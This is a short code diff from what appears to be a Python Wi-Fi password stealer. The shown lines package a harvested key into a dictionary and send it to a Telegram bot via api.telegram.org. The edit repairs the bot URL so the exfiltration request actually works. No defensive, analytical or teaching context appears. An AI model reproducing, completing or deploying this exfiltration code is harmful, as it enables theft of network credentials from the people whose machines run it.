@@ -41,9 +41,8 @@ def main():
                 "password": keyMaterial
             }
 
-            print(wifi)
-            requests.post(f"https://api.telegram.org/{BOT_TOKEN}/"
-                          f"sendMessage?chat_id={USER_ID}&text={wifi}")
+            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/"
+                         f"sendMessage?chat_id={USER_ID}&text={wifi}")
 
 
 if __name__ == '__main__':
